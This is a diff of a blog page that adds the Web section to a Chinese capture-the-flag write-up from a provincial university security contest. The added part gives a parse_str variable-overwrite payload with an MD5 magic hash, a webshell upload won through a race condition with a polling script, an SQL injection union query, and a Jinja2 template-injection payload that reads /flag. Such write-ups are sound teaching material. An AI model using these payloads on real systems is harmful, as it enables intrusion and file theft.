@@ -188,7 +188,9 @@
 			<div class="am-article-bd">
 				<div class="content" id="post-content">
 					
-						<h2 id="第七届山东省大学生网络安全技能大赛Writeup"><a href="#第七届山东省大学生网络安全技能大赛Writeup" class="headerlink" title="第七届山东省大学生网络安全技能大赛Writeup"></a>第七届山东省大学生网络安全技能大赛Writeup</h2><p>文章首发于先知社区：<a href="https://xz.aliyun.com/t/3295" target="_blank" rel="noopener">https://xz.aliyun.com/t/3295</a></p>
+						<h2 id="第七届山东省大学生网络安全技能大赛Writeup"><a href="#第七届山东省大学生网络安全技能大赛Writeup" class="headerlink" title="第七届山东省大学生网络安全技能大赛Writeup"></a>第七届山东省大学生网络安全技能大赛Writeup</h2><p>闲着没事把第七届山东省大学生网络安全技能大赛题目复现一下，也算巩固一下个人对于一些题目的理解</p>
+<p>本文首发于先知社区：<a href="https://xz.aliyun.com/t/3295" target="_blank" rel="noopener">https://xz.aliyun.com/t/3295</a></p>
+<p><img src="https://i.imgur.com/Qel0Cia.jpg" alt=""></p>
 <h3 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h3><h4 id="1-Crack-it"><a href="#1-Crack-it" class="headerlink" title="1.Crack it"></a>1.Crack it</h4><p><strong>题目描述</strong></p>
 <p>破解该文件，获得密码，flag格式为：flag{<strong>***</strong>}</p>
 <p><strong>知识点</strong></p>
@@ -381,7 +383,57 @@ print flag
 <p><img src="https://i.imgur.com/9xf7ERu.png" alt=""></p>
 <p>解压后得到doc文件，当成压缩包解密，能找到flag.txt中有一串base64编码的字符串，解码即可。</p>
 <pre><code>flag{d0cX_1s_ziP_file}
-</code></pre>
+</code></pre><h3 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h3><h4 id="web1-babyweb"><a href="#web1-babyweb" class="headerlink" title="web1 - babyweb"></a>web1 - babyweb</h4><p>加XFF头和更改cookie的admin</p>
+<p><img src="https://i.imgur.com/mSftQdp.png" alt=""></p>
+<h4 id="web2-babyweb2"><a href="#web2-babyweb2" class="headerlink" title="web2 - babyweb2"></a>web2 - babyweb2</h4><pre><code>&lt;?php
+
+include &#39;here.php&#39;;
+$key = &#39;kelaibei&#39;;
+
+if(isset($_GET[&#39;id&#39;])){
+$id = $_GET[&#39;id&#39;];
+@parse_str($id);
+if ($key[99] != &#39;aabg7XSs&#39; &amp;&amp; md5($key[99]) == md5(&#39;aabg7XSs&#39;)) {
+   echo $hint;
+}
+else{
+echo &#39;try again&#39;;
+}
+}
+else{
+show_source(__FILE__);
+}
+</code></pre><p>利用parse_str变量覆盖，<code>paylaod:?id=key[99]=QNKCDZO</code></p>
+<p>得到<code>upl04d50m3thing.php</code></p>
+<p><img src="https://i.imgur.com/PAjSO1g.png" alt=""></p>
+<p>写入一句话,提交得到php文件链接，访问发现内容被更改，输出Too slow!</p>
+<p>利用条件竞争，先用burp的intruder开多线程访问</p>
+<p><img src="https://i.imgur.com/CbO2dEm.png" alt=""></p>
+<p>再利用脚本或其他方式尝试getshell</p>
+<pre><code>import requests
+url = &#39;http://47.105.148.65:29002/uploads/457b055ce2a489dd334216ed0564f9351506d690/coold.php&#39;
+while 1:
+r = requests.get(url)
+if &#39;flag&#39; in  r.text:
+print r.text
+
+flag{fa8d57d013fda75ad1e58e59b94b45c3}
+</code></pre><h4 id="easy-flask"><a href="#easy-flask" class="headerlink" title="easy_flask"></a>easy_flask</h4><p>Search Comments:处存在sql注入’ order by 4# 出现错误</p>
+<p><img src="https://i.imgur.com/cZqhR1N.png" alt=""></p>
+<p>然后查询</p>
+<p><img src="https://i.imgur.com/LMLaANC.png" alt=""></p>
+<p>存在ssti</p>
+<p>SSTI，又称服务端模板注入攻击。其发生在MVC框架中的view层。</p>
+<p>服务端接收了用户的输入，将其作为 Web 应用模板内容的一部分，在进行目标编译渲染的过程中，执行了用户插入的恶意内容，</p>
+<p>因而可能导致了敏感信息泄露、代码执行、GetShell 等问题</p>
+<p>但是add中限制字符长度，最多提交十个字符，没法正常使用ssti</p>
+<p>测试search功能，username中存在sql注入</p>
+<pre><code>sdpcc &#39; union select 1,1,1 -- -
+</code></pre><p><img src="https://i.imgur.com/Ol6uhqy.png" alt=""></p>
+<p>尝试查看flag</p>
+<pre><code>{{ ().__class__.__bases__[0].__subclasses__()[40]("/flag").read()}}
+</code></pre><p>就会得到flag:<code>flag{c15f43da-481e-4131-84b2-e315719b989b}</code></p>
+
 					
 				</div>
 			</div>
@@ -483,7 +535,7 @@ print flag
 				
 				
 				<!--toc(post.content)-->
-				<ol class="post-toc"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#第七届山东省大学生网络安全技能大赛Writeup"><span class="post-toc-text">第七届山东省大学生网络安全技能大赛Writeup</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Misc"><span class="post-toc-text">Misc</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#1-Crack-it"><span class="post-toc-text">1.Crack it</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#2-进制转换"><span class="post-toc-text">2.进制转换</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#3-basic"><span class="post-toc-text">3.basic</span></a></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Crypto"><span class="post-toc-text">Crypto</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#1-affine"><span class="post-toc-text">1.affine</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#2-rsa"><span class="post-toc-text">2.rsa</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#3-神秘的代码"><span class="post-toc-text">3.神秘的代码</span></a></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Stego"><span class="post-toc-text">Stego</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#1-啊哒"><span class="post-toc-text">1.啊哒</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#2-color"><span class="post-toc-text">2.color</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#3-神秘的文件"><span class="post-toc-text">3.神秘的文件</span></a></li></ol></li></ol></li></ol>
+				<ol class="post-toc"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#第七届山东省大学生网络安全技能大赛Writeup"><span class="post-toc-text">第七届山东省大学生网络安全技能大赛Writeup</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Misc"><span class="post-toc-text">Misc</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#1-Crack-it"><span class="post-toc-text">1.Crack it</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#2-进制转换"><span class="post-toc-text">2.进制转换</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#3-basic"><span class="post-toc-text">3.basic</span></a></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Crypto"><span class="post-toc-text">Crypto</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#1-affine"><span class="post-toc-text">1.affine</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#2-rsa"><span class="post-toc-text">2.rsa</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#3-神秘的代码"><span class="post-toc-text">3.神秘的代码</span></a></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Stego"><span class="post-toc-text">Stego</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#1-啊哒"><span class="post-toc-text">1.啊哒</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#2-color"><span class="post-toc-text">2.color</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#3-神秘的文件"><span class="post-toc-text">3.神秘的文件</span></a></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Web"><span class="post-toc-text">Web</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#web1-babyweb"><span class="post-toc-text">web1 - babyweb</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#web2-babyweb2"><span class="post-toc-text">web2 - babyweb2</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#easy-flask"><span class="post-toc-text">easy_flask</span></a></li></ol></li></ol></li></ol>
 			</nav>
 			<div class="post-toc-bar"><div>
 		</div></div></aside>
